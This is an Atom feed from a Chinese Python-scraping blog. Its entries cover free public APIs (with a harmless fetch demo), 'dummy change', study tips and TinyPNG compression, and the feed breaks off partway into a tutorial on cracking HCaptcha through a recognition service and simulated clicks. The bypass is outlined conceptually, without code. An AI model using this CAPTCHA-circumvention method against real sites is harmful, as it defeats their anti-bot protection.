<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>静觅</title>
  
  <subtitle>崔庆才的个人站点 - Python爬虫教程</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cuiqingcai.com/"/>
  <updated>2022-08-01T15:41:26.008Z</updated>
  <id>https://cuiqingcai.com/</id>
  
  <author>
    <name>崔庆才</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>推荐一套公开的 API 接口</title>
    <link href="https://cuiqingcai.com/36064.html"/>
    <id>https://cuiqingcai.com/36064.html</id>
    <published>2022-07-30T11:00:13.000Z</published>
    <updated>2022-08-01T15:41:26.008Z</updated>
    
    <content type="html"><![CDATA[<p>在某些情况下，我们可能想做一些 Demo 或者写一些测试，比如想做个网站展示一些宠物的图片，或者想实现某个 API 请求的实现逻辑，这时候你会怎么做呢？</p><p>自己找点数据然后搭建一套 API 接口吗？</p><p>可以是可以，虽然说并不是特别麻烦，但准备数据、编写逻辑、设置跨域等还是要费一些时间的。</p><p>其实，网上有很多很多免费的 API 接口可以直接拿来用的，而且各种类型的数据应有尽有，有了它们，我们就不用费尽心思自己搭建 API 了。</p><p>接下来就来给大家介绍一个库，里面收集了各种公开的数据接口。</p><h2 id="public-apis"><a href="#public-apis" class="headerlink" title="public-apis"></a>public-apis</h2><p>这个仓库就叫做 public-apis，其 GitHub 地址是 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B1YmxpYy1hcGlzL3B1YmxpYy1hcGlz">https://github.com/public-apis/public-apis<i class="fa fa-external-link-alt"></i></span>。</p><p>其介绍是：</p><blockquote>  <p><em>A collective list of free APIs for use in software and web development</em></p></blockquote><p>一套公开 API，可以用于软件和 Web 开发。</p><p>这些API 特别全面，包含了各种各样的类别。</p><p>比如我们先来看下他的一些分类：</p><p><img src="https://qiniu.cuiqingcai.com/50ad0.png" alt=""></p><p>如图所示，可以看到这个仓库划分了很多大类别，比如动物、设计、书籍、商业、娱乐等几十个大类，按照字母排序，每个大类都有对应的 API 可供我们使用。</p><p>比如我们先看下动物的分类，则可以发现类似如下的表格：</p><p><img src="https://qiniu.cuiqingcai.com/hioxz.png" alt=""></p><p>这个表格一共有五列，包括 API 的地址、描述、是否需要 Auth、是否支持 HTTPS、是否支持跨域，可以看到动物类别就有好多 API，比如 Dogs、Cats、Bear 等等，这些 API 就可以返回一些猫、狗、熊等图片的列表。</p><p>一般来说，我们可以选择 Auth 为 No，HTTPS 为 Yes、CORS 为 Yes 的，即使用 API 不需要 key，同时支持 HTTPS，而且支持跨域，这样在网页中我们就可以自由调用了。</p><p>我们随便选几个来看下。</p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>Dogs API 就是其中一个，网址为 <span class="exturl" data-url="aHR0cHM6Ly9kb2cuY2VvL2RvZy1hcGkv">https://dog.ceo/dog-api/<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/f7ivx.png" alt=""></p><p>打开之后我们可以看到一个介绍网站，同时这里有一个 Fetch 按钮，我们点一下就可以获得一张随机的狗狗图片。</p><p>其 API 地址就是 <span class="exturl" data-url="aHR0cHM6Ly9kb2cuY2VvL2FwaS9icmVlZHMvaW1hZ2UvcmFuZG9t">https://dog.ceo/api/breeds/image/random<i class="fa fa-external-link-alt"></i></span>，我们也可以直接用浏览器打开，结果如下：</p><p><img src="https://qiniu.cuiqingcai.com/mgdo7.png" alt=""></p><p>可以看到返回结果是 JSON 格式，我们对其进行简单解析就可以提取里面的 message 字段，也就能获得一张随机的狗狗照片，然后展示在网站上了。</p><p>简单写个 html 页面，几行代码就可以实现随机狗狗图片的展示：</p><figure class="highlight html">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"dog"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    fetch(<span class="string">"https://dog.ceo/api/breeds/image/random"</span>)</span></span><br><span class="line"><span class="javascript">      .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.json())</span></span><br><span class="line"><span class="javascript">      .then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"dog"</span>).src = data.message;</span></span><br><span class="line">      &#125;);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><p>运行效果如下：</p><p><img src="https://qiniu.cuiqingcai.com/0p033.png" alt=""></p><p>是不是还是挺方便的？</p><p>另外回到网站本身，它还提供了相关文档介绍所有接口的用法：<span class="exturl" data-url="aHR0cHM6Ly9kb2cuY2VvL2RvZy1hcGkvZG9jdW1lbnRhdGlvbi8=">https://dog.ceo/dog-api/documentation/<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/0gk4e.png" alt=""></p><p>比如这里有列出所有狗的品种、根据品种返回狗的照片、随机狗的照片等等，具体可以去看文档哈。</p><h2 id="其他介绍"><a href="#其他介绍" class="headerlink" title="其他介绍"></a>其他介绍</h2><p>另外其实还有很多有意思的 API，我们随便来看几个。</p><h3 id="EmojiHub"><a href="#EmojiHub" class="headerlink" title="EmojiHub"></a>EmojiHub</h3><p>比如 EmojiHub 这个 API 提供了接口来返回一些 Emoji 表情，种类丰富多种多样，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoZWF0c25ha2UvZW1vamlodWI=">https://github.com/cheatsnake/emojihub<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/gafvo.png" alt=""></p><h3 id="Icon-Horse"><a href="#Icon-Horse" class="headerlink" title="Icon Horse"></a>Icon Horse</h3><p>Icon Horse 提供了各种返回网站图标的功能，<span class="exturl" data-url="aHR0cHM6Ly9pY29uLmhvcnNlLw==">https://icon.horse/<i class="fa fa-external-link-alt"></i></span></p><p>比如维基百科就可以填写 Wikipedia.org，就可以获取其网站图标了：</p><p><img src="https://qiniu.cuiqingcai.com/pr922.png" alt=""></p><h3 id="bible-api"><a href="#bible-api" class="headerlink" title="bible-api"></a>bible-api</h3><p>这个 API 提供了多语言版本的《圣经》内容：<span class="exturl" data-url="aHR0cHM6Ly9iaWJsZS1hcGkuY29tLw==">https://bible-api.com/<i class="fa fa-external-link-alt"></i></span>：</p><p><img src="https://qiniu.cuiqingcai.com/2tx6e.png" alt=""></p><h3 id="Free-Dictionary-API"><a href="#Free-Dictionary-API" class="headerlink" title="Free Dictionary API"></a>Free Dictionary API</h3><p>Free Dictionary API 提供了各种单词的查询和释义，我们可以直接用 API 获取某个单词的含义、发音、音标、翻译等：<span class="exturl" data-url="aHR0cHM6Ly9kaWN0aW9uYXJ5YXBpLmRldi8=">https://dictionaryapi.dev/<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/jfe73.png" alt=""></p><h3 id="EconDB"><a href="#EconDB" class="headerlink" title="EconDB"></a>EconDB</h3><p>EconDB 提供了全球宏观经济数据，公开免费：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNvbmRiLmNvbS8=">https://www.econdb.com/<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/j4p1y.png" alt=""></p><h3 id="NBA-stats"><a href="#NBA-stats" class="headerlink" title="NBA stats"></a>NBA stats</h3><p>NBA Stats 提供了 NBA 有史以来各种数据，比如每场比赛数据、球员数据等等：<span class="exturl" data-url="aHR0cHM6Ly9hbnktYXBpLmNvbS9uYmFfY29tL25iYV9jb20vZG9jcy9BUElfRGVzY3JpcHRpb24=">https://any-api.com/nba_com/nba_com/docs/API_Description<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/bu4b7.png" alt=""></p><h3 id="Nobel-Prize"><a href="#Nobel-Prize" class="headerlink" title="Nobel Prize"></a>Nobel Prize</h3><p>Nobel Prize 这个接口返回了有关诺贝尔奖项的各种记录和活动：<span class="exturl" data-url="aHR0cHM6Ly93d3cubm9iZWxwcml6ZS5vcmcvYWJvdXQvZGV2ZWxvcGVyLXpvbmUtMi8=">https://www.nobelprize.org/about/developer-zone-2/<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/bchlj.png" alt=""></p><h3 id="Faker-API"><a href="#Faker-API" class="headerlink" title="Faker API"></a>Faker API</h3><p>Faker API 提供了各种假数据生成器，比如生成假名字、假地址、假电话号码、假地理位置等等，方便测试和开发使用：<span class="exturl" data-url="aHR0cHM6Ly9mYWtlcmFwaS5pdC9lbg==">https://fakerapi.it/en<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/qcllw.png" alt=""></p><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>总之，还有很多很多很多，当然其中也有收费的。</p><p>大家到时候有想要的数据可以来这里先搜搜看，说不定会有意外惊喜呢！</p><p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在某些情况下，我们可能想做一些 Demo 或者写一些测试，比如想做个网站展示一些宠物的图片，或者想实现某个 API 请求的实现逻辑，这时候你会怎么做呢？&lt;/p&gt;
&lt;p&gt;自己找点数据然后搭建一套 API 接口吗？&lt;/p&gt;
&lt;p&gt;可以是可以，虽然说并不是特别麻烦，但准备数据、编
      
    
    </summary>
    
    
      <category term="技术杂谈" scheme="https://cuiqingcai.com/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="API" scheme="https://cuiqingcai.com/tags/API/"/>
    
      <category term="接口" scheme="https://cuiqingcai.com/tags/%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>什么是 dummy change？</title>
    <link href="https://cuiqingcai.com/36063.html"/>
    <id>https://cuiqingcai.com/36063.html</id>
    <published>2022-06-12T12:40:56.000Z</published>
    <updated>2022-08-01T15:41:26.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://files.mdnice.com/user/9693/6d24aaa2-ac44-4a5a-a30a-8a2a00b4fe9d.png" alt="img"></p><p>最近在工作上遇到了一个新词：dummy change，是在邮件沟通过程中遇到的，起因是某个 Pipeline 有个 Bug，但配置文件又没啥问题，所以对方建议让我对配置文件做点 dummy change，然后来触发 Pipeline 的刷新。</p><p>我一开始就不懂，啥叫 dummy change 啊？</p><p>然后我就查了下，这里分享给大家。</p><p>dummy，意思就是假的意思，就是假的 change，就是实际上变了，但看起来又没变。</p><p><img src="https://files.mdnice.com/user/9693/d6890546-6c36-4542-8f1e-d86c74ed0ef4.png" alt="img"></p><p>比如，一个文件，我们在某个地方加个空格、加个空行，表面上其实配置文件的内容没有变化，配置还是原来的配置，但是文件本身因为一个空行或者空格而发生了变化。</p><p>所以，dummy change 其实大多数就是文件某处改个空格、加个空行、修改点无关紧要注释啥的，没啥本质影响，但实际让文件本身变化，以便引发一些相关操作。</p><p>希望对大家有帮助。</p><p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://files.mdnice.com/user/9693/6d24aaa2-ac44-4a5a-a30a-8a2a00b4fe9d.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;最近在工作上遇到了一个新词：dummy change，是在邮件沟
      
    
    </summary>
    
    
      <category term="技术杂谈" scheme="https://cuiqingcai.com/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="dummy change" scheme="https://cuiqingcai.com/tags/dummy-change/"/>
    
      <category term="Bug" scheme="https://cuiqingcai.com/tags/Bug/"/>
    
  </entry>
  
  <entry>
    <title>学习新知识时的几个技巧</title>
    <link href="https://cuiqingcai.com/36062.html"/>
    <id>https://cuiqingcai.com/36062.html</id>
    <published>2022-06-12T12:37:13.000Z</published>
    <updated>2022-08-01T15:41:26.004Z</updated>
    
    <content type="html"><![CDATA[<p>时代在发展，我们也需要不断进步和学习。</p><p>在一生中我们需要学习各种各样的新知识，但有时候我们在学习的时候可能感觉比较茫然，或者无从下手，或者不知道这个知识到底有什么用，或者学的过程中都不知道学到哪里了，还有多少才会学完。</p><p>这里，分享我看《暗时间》书了解到的一些技巧。</p><p>主要就是三个，也就是说，学习知识时来问自己三个问题：</p><ul>  <li>    <p>它的本质是什么</p>  </li>  <li>    <p>它的第一原则是什么</p>  </li>  <li>    <p>它的知识结构是怎样的</p>  </li></ul><h2 id="它的本质是什么"><a href="#它的本质是什么" class="headerlink" title="它的本质是什么"></a>它的本质是什么</h2><p>我们拿技术知识为例，比如我们要学 Django 开发一个网页，那么我们实际上是学了什么？实际上是学了一些 Django 的 API 和命令的用法、 Python 的语法。我们根据 API 的操作说明做了，那其实就能完成一个网页的搭建，因为我们使用了它现有的框架，基于现有的轮子来做东西。</p><p>但这里来了一个问题，假如我们之前是基于 1.10 版本的 Django 框架开发的网页，但现在 Django 升级到了 3.0，很多 API 的用法都变了，那之前 1.10 的 API 即使我们用的滚瓜烂熟甚至都背过了都没啥用了，因为 API 改了，那我们就不得不再去查文档看具体的用法。</p><p>这时候，我们要想想，学习这个 Django 技术的过程中，我们学到的是什么？实际上我们学到的就是 Django 框架的一些 API 用法，利用 Django 这个框架写了自己的业务逻辑而已，Django 已经帮我们处理了很多底层的东西，从而快速成型了一个网站。而网站的本质又是什么？实际上就是用户在浏览器中输入对应的 URL，然后服务器对相应的请求进行处理，并返回对应的内容，这本身又涉及到计算机网络很多的基础知识，比如请求都包含了什么，怎样进行逻辑处理，怎样和数据库交互，怎样返回响应，这些 Django 都帮我们做了，我们在写的时候无需关心得这么底层，但我们需要知道这背后发生的事情。如果我们压根不知道 Django 背后发生了什么，只是知道 API 变了，那出现问题的时候，我们根本不知道怎么去追查问题，不可能去从源码级别分析根本原因，也不知道怎么去优化和提速。</p><p>上面只是一个例子，很多知识其实背后都有其本质的东西，和一些不变的东西。而越本质的东西基本上变化的情形越少。</p><p>我们经常会感叹自己跟不上新技术的发展，却往往忽略了这些新技术背后都是什么。现在很多的新技术只是一层皮而已，比如 Django 框架基于 Python 对计算机网络、数据库等底层内容进行了很好的封装，比如 Scrapy 框架底层就包括网络请求处理、消息队列等内容，Vue 框架则是基于原生 JavaScript 对数据监听和绑定做了很好的封装和优化，通过虚拟 DOM 等机制来处理了页面渲染。那这些技术还有没有更底层的内容呢？有，比如浏览器、操作系统、计算机体系结构、计算机组成相关的内容。越追到底层，越发现其本质越是不变的。</p><p>另外，除了一些技术相关的本质内容，还有一些不变和永不过时的东西，比如算法和数据结构、基本的程序设计理论、良好的编码习惯、分析和解决问题的能力、强大的学习能力、旺盛的求知欲、良好的思维方式。</p><p>所以，我们尽量去抓住一些本质的、不过时的东西，这些才是最稳的。</p><h2 id="第一原则是什么"><a href="#第一原则是什么" class="headerlink" title="第一原则是什么"></a>第一原则是什么</h2><p>刚才我们说了，学一个东西我们要了解本质的东西，那么难道我要在学习 Django 框架的时候要把计算机网络、操作系统、计算机组成原理等所有的东西全都挨个学一遍？这得学到猴年马月啊。</p><p>所以，这里需要澄清的一点是，我们说要了解本质是什么并不是要求我们现在立马就把本质的东西全部去了解清楚，因为这里面的体系实在是太庞大了，递归学进去啥时候才能出得来啊？</p><p>所以，我们可以先从大致层面上知道它的本质，知道这个要学的知识在整个知识体系中处于一个怎样的位置上，有一个整体大局观。然后其本质的东西，我们有时间可以重点再一个个突破，因为毕竟这是很多技术的共性。</p><p>所以，这里就再引出了第二个需要注意的点：我们要知道学习这个东西的第一原则是什么。</p><p>比如我要学习好 Django 框架，那么我的原则其实就是学会 Django 的 API 和命令的用法，然后能够利用它搭建好网站，知道它能够做什么，有什么优缺点，有问题了知道怎么查，这是第一原则。</p><p>在学习的时候，我们按照这个原则来学习，这样整体效率和方向感就会好很多。</p><p>这“第一原则”听起来和刚才说的“了解本质”有点冲突啊？但实际上不冲突，“第一原则”说的是我们学知识的时候我们心里有一个目标和原则和大方向，“了解本质”是说我们也要知道这项知识它的整体定位和其背后都是什么。至于本质的东西，我们后面可以再慢慢去击破，去慢慢深入了解。</p><h2 id="知识体系是什么"><a href="#知识体系是什么" class="headerlink" title="知识体系是什么"></a>知识体系是什么</h2><p>知识体系嘛，顾名思义，就是整体脉络。</p><p>我们常常会觉得学习一个技术，不知道啥时候是个头，不知道学到哪里了，这其实就是缺乏了整体的知识体系。</p><p>一个知识体系可以帮我们在头脑中建立一个整体的框架，其实就像一本书的目录大纲，一门课的思维导图一样，多去了解下这些内容，会帮助我们很好地建立一个知识体系。</p><p>另外，某些知识可能并没有现成的知识体系，我们也要想办法构建一个知识体系。</p><p>这里有一个小技巧，学习一个领域知识的时候，时时把“最终能写出一篇漂亮的综述”放在大脑中提醒自己，这有助于我们在阅读中有意无意地整理知识的结构、本质和重点，经过整理之后的知识理解也会更深刻。</p><p>共勉。</p><p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;时代在发展，我们也需要不断进步和学习。&lt;/p&gt;
&lt;p&gt;在一生中我们需要学习各种各样的新知识，但有时候我们在学习的时候可能感觉比较茫然，或者无从下手，或者不知道这个知识到底有什么用，或者学的过程中都不知道学到哪里了，还有多少才会学完。&lt;/p&gt;
&lt;p&gt;这里，分享我看《暗时间》书
      
    
    </summary>
    
    
      <category term="个人随笔" scheme="https://cuiqingcai.com/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="学习" scheme="https://cuiqingcai.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="学习技巧" scheme="https://cuiqingcai.com/tags/%E5%AD%A6%E4%B9%A0%E6%8A%80%E5%B7%A7/"/>
    
      <category term="阅读" scheme="https://cuiqingcai.com/tags/%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>推荐一个超强的图片压缩网站！</title>
    <link href="https://cuiqingcai.com/36061.html"/>
    <id>https://cuiqingcai.com/36061.html</id>
    <published>2022-06-03T10:27:13.000Z</published>
    <updated>2022-08-01T15:41:26.008Z</updated>
    
    <content type="html"><![CDATA[<p>我们肯定经常跟图片打交道吧，不管是写文章、传图片还是网站开发，我们或多或少都要插图，但有时候图片体积比较大的时候就会带来加载速度慢的一些问题，那么这时候你可能会有这么一个需求：</p><blockquote>  <p>有没有什么办法在保证图片清晰度的时候把图片的体积压缩到最小？</p></blockquote><p>大家通常会用什么办法呢？</p><p>我的话其实用的比较多的办法就是使用 PS，然后另存为 Web 所用格式，但用到这个功能我还得额外装个 PS，感觉比较麻烦。</p><p>所以，今天给大家推荐一个非常好用的图片压缩网站，可以将图片体积缩小一大半，同时几乎不改变图片清晰度。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>直接开门见山，网站地址是：<span class="exturl" data-url="aHR0cHM6Ly90aW55cG5nLmNvbS8=">https://tinypng.com/<i class="fa fa-external-link-alt"></i></span>，名称就叫 TinyPNG。</p><p>看名字我们就知道 tiny + png，tiny 就是小，png 就是图片的一种格式，就和图片压缩很接近了，简单好记。</p><p>那它的主要功能是什么呢？我们来看下主页：</p><p><img src="https://qiniu.cuiqingcai.com/z387a.png" alt=""></p><p>可以看到，网站的一个大标题就是 “Smart WebP, PNG and JPEG compression”，意思就是智能的 WebP、PNG 和 JPEG 格式的压缩工具。</p><p>那么这个网站做了什么呢？</p><p>TinyPNG 网站举了一个例子：</p><p><img src="https://qiniu.cuiqingcai.com/b219p.png" alt=""></p><p>可以看到原始图片和压缩后的图片对比几乎没有什么差别，而压缩前图片有 57KB，压缩后只有 15 KB。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>看介绍感觉很厉害的样子啊，那我们来测试下看看吧，这次我们从网上先保存一张图片来看看：</p><p><img src="https://qiniu.cuiqingcai.com/rz2za.png" alt=""></p><p>这张图片原图大小是 3.5MB，分辨率是 2356x1310，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/o3725.png" alt=""></p><p>下面我们来上传下，点击这里就可以上传了，或者直接把图片拖拽到这个位置就可以：</p><p><img src="https://qiniu.cuiqingcai.com/tll6m.png" alt=""></p><p>这里写着我们可以上传最多 20 张图片，每张图片大小不超过 5MB，感觉这个限制已经相对宽松了。</p><p>压缩完成之后显示，我们图片的最终大小成了 999.1KB，整整缩小了 71%！</p><p><img src="https://qiniu.cuiqingcai.com/gq1q8.png" alt=""></p><p>到底效果行不行，拉出来溜溜。</p><p>然后我们可以直接点击 Download 按钮下载下来就好，压缩后的图片效果如下：</p><p><img src="https://qiniu.cuiqingcai.com/9oivp.png" alt=""></p><p>放在一起对比下：</p><p><img src="https://qiniu.cuiqingcai.com/rph4z.png" alt=""></p><p>能看出哪个才是原图吗？</p><p>其实第二张才是原图，是不是几乎看不出什么差别？</p><h2 id="背后技术"><a href="#背后技术" class="headerlink" title="背后技术"></a>背后技术</h2><p>看简介可以了解到，TinyPNG 这个网站使用了有损压缩技术来减小 WebP、PNG、JPEG 格式图片的文件大小，它通过有选择地减少图像中的颜色数量来达到压缩效果，同时由于咱们人眼对这种细微颜色变化感知比较弱，所以压缩前后图片在人眼看到几乎是没什么区别的。</p><p>对于 PNG 图片来说，它其实细分为 PNG-8 和 PNG-24，它们有什么区别呢？</p><p>其实我们知道，每一个图片都是由一个个像素点组成的对吧，每一个像素点都有一定的颜色，那许许多多的像素点排列在一起就组成了一张图片。</p><p>在计算机里面，每个像素点其实都有一定的存储单位来表示，对于 PNG-8 来说，一个像素点是由 8 位二进制数表示的，而计算机中 8 位最多表示 2 的八次方，即 256 种组合，其实一个像素就能显示 256 种颜色。同理，而 PNG-24 就相当于一个像素点用 24 位来表示，所以能表示的颜色数量就是 2 的 24 次方，结果约 1600 万。所以 PNG-24 相比 PNG-8 来说每个像素可表示的颜色就多非常多，色彩也就更丰富，所以 PNG-24 适合摄影作品之类的比较丰富的图片。但随之而来的 ，PNG-24 的文件体积相比 PNG-8 也会大很多。</p><p>而对于人眼来说，其实一张图片用 PNG-8 和 PNG-24 来表示，如果不仔细放大看的话，效果其实不太明显。所以有时候我们为了更高的压缩比，就可以选用 PNG-8 这种图片存储格式，其体积会小一大半，加载速度也会快很多。</p><p>所以这种图很适合在网站开发的时候使用，所以你可以看到一些网站的 Logo、Banner 图都是 PNG-8 类型的图片。</p><p>所以实际上，TinyPNG 这个网站其实就是把 PNG-24 的图转成了 PNG-8 而已。</p><h2 id="进一步测试"><a href="#进一步测试" class="headerlink" title="进一步测试"></a>进一步测试</h2><p>那知道原理之后，我们如果把 PNG-8 的图片再上传给 TinyPNG 这个网站，还能获得压缩吗？</p><p>我们来试试。</p><p><img src="https://qiniu.cuiqingcai.com/jp5iz.png" alt=""></p><p>可以看到，我们将压缩后的图片再次尝试压缩，这次最终可能就是 959.9 KB 了，只获得了 4% 的压缩，所以可以看到几乎也没有什么压缩空间了。因为它无法再将 PNG-8 进一步降低每个像素的表示位数了。</p><h2 id="支持情况"><a href="#支持情况" class="headerlink" title="支持情况"></a>支持情况</h2><p>看来这个压缩效果的确还可以的，那么它的兼容性怎么样？</p><p>介绍说，它支持所有主流的浏览器，比如 Chrome、Firefox、Safari、Edge 甚至一些移动设备浏览器也是有很好的支持的，所以平时只要我们有浏览器，就能用了。</p><h2 id="支持-APNG-吗？"><a href="#支持-APNG-吗？" class="headerlink" title="支持 APNG 吗？"></a>支持 APNG 吗？</h2><p>不知道大家有没有听说过一种 PNG 图片格式，叫做 APNG，其实就是 Animated PNG，就是可以动的 PNG 图片，比如这张图片：<span class="exturl" data-url="aHR0cHM6Ly9lemdpZi5jb20vaW1hZ2VzL2FwbmcucG5n">https://ezgif.com/images/apng.png<i class="fa fa-external-link-alt"></i></span></p><p>大家可以打开看看效果。</p><p>对于这种图片，现在主流的浏览器也都支持显示了，如果你的浏览器支持，那么能看到这张图片是动的。</p><p>TinyPNG 对 APNG 这种格式也是支持的！</p><h2 id="对于-PS-的支持"><a href="#对于-PS-的支持" class="headerlink" title="对于 PS 的支持"></a>对于 PS 的支持</h2><p>TinyPNG 也提供了 PS 的插件，安装之后我们也可以在 PS 里面直接使用 TinyPNG 了：</p><p><img src="https://qiniu.cuiqingcai.com/kvjs2.png" alt=""></p><p>这个插件适用于 PS 的 CS5、CS6、CC2013-2022 所有版本。</p><p>具体大家可以看 <span class="exturl" data-url="aHR0cHM6Ly90aW55cG5nLmNvbS9waG90b3Nob3A=">https://tinypng.com/photoshop<i class="fa fa-external-link-alt"></i></span></p><p>不过坏消息是，这个插件是收费的，大家按需上车。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>好了，以上就是本文章全部内容了，希望对大家有帮助。</p><p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我们肯定经常跟图片打交道吧，不管是写文章、传图片还是网站开发，我们或多或少都要插图，但有时候图片体积比较大的时候就会带来加载速度慢的一些问题，那么这时候你可能会有这么一个需求：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;有没有什么办法在保证图片清晰度的时候把图片的体积压缩
      
    
    </summary>
    
    
      <category term="技术杂谈" scheme="https://cuiqingcai.com/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="图片压缩" scheme="https://cuiqingcai.com/tags/%E5%9B%BE%E7%89%87%E5%8E%8B%E7%BC%A9/"/>
    
      <category term="视频压缩" scheme="https://cuiqingcai.com/tags/%E8%A7%86%E9%A2%91%E5%8E%8B%E7%BC%A9/"/>
    
      <category term="压缩" scheme="https://cuiqingcai.com/tags/%E5%8E%8B%E7%BC%A9/"/>
    
  </entry>
  
  <entry>
    <title>HCaptcha的模拟点击破解教程来了！</title>
    <link href="https://cuiqingcai.com/36060.html"/>
    <id>https://cuiqingcai.com/36060.html</id>
    <published>2022-05-30T10:03:12.000Z</published>
    <updated>2022-08-01T15:41:25.964Z</updated>
    
    <content type="html"><![CDATA[<p>前面的文章我们介绍过 ReCaptcha 的模拟点击破解教程，但除了 ReCaptcha，还有另外和 ReCapacha 验证流程很相似的验证码，叫做 HCaptcha。</p><p>ReCaptcha 是谷歌家的，因为某些原因，咱们国内是无法使用 ReCaptcha 的，所以有时候 HCaptcha 也成了一些国际性网站的比较好的选择。</p><p>那今天我们就来了解下 HCaptcha 和它的模拟点击破解流程。</p><h2 id="HCaptcha"><a href="#HCaptcha" class="headerlink" title="HCaptcha"></a>HCaptcha</h2><p>我们首先看看 HCaptcha 的验证交互流程，其 Demo 网站为 <span class="exturl" data-url="aHR0cHM6Ly9kZW1vY2FwdGNoYS5jb20vZGVtby1mb3JtLWVuZy9oY2FwdGNoYS5odG1s">https://democaptcha.com/demo-form-eng/hcaptcha.html<i class="fa fa-external-link-alt"></i></span>，打开之后，我们可以看到如下的验证码入口页面：</p><p><img src="https://qiniu.cuiqingcai.com/i3g6q.png" alt=""></p><p>看起来入口和 ReCaptcha 很相似的对吧，其实验证流程也是很类似的。</p><p>当我们点击复选框时，验证码会先通过其风险分析引擎判断当前用户的风险，如果是低风险用户，便可以直接通过，反之，验证码会弹出对话框，让我们回答对话框中的问题，类似如下：</p><p><img src="https://qiniu.cuiqingcai.com/x94ez.png" alt=""></p><p>这时候我们看到 HCaptcha 验证码会给我们一个问题，比如上图的问题是「请点击每张包含飞机的图片」，我们需要从下面的九张图中选择出含有飞机的图片，如果九张图片中，没有飞机，则点击「跳过 / Skip」按钮，如果有，则将所有带有飞机的图片都选择上，跳过按钮会变成「检查 / Verify」按钮，验证通过之后我们就可以看到如下的验证成功的效果了：</p><p><img src="https://qiniu.cuiqingcai.com/8ncsk.png" alt=""></p><p>是不是整体流程和 ReCaptcha 还是还是非常相近的？</p><p>但其实这个比 ReCaptcha 简单一些，它的验证码图片每次一定是 3x3 的，没有 4x4 的，而且点击一个图之后不会再出现一个新的小图让我们二次选择，所以其破解思路也相对简单一些。</p><h2 id="如何破解"><a href="#如何破解" class="headerlink" title="如何破解"></a>如何破解</h2><p>整个流程其实我们稍微梳理下，就知道整体的的破解思路了，有这么两个关键点：</p><ul>  <li>    <p>第一就是把上面的文字内容找出来，以便于我们知道要点击的内容是什么。</p>  </li>  <li>    <p>第二就是我们要知道哪些目标图片和上面的文字是匹配的，找到了依次模拟点击就好了。</p>  </li></ul><p>听起来似乎很简单的对吧，但第二点是一个难点，我们咋知道哪些图片和文字匹配的呢？这就是一个难题。</p><p>前面 ReCaptcha 的破解过程我们了解过了使用 YesCaptcha 来进行图片的识别，除了 ReCaptcha，YesCaptcha 其实也支持 HCaptcha 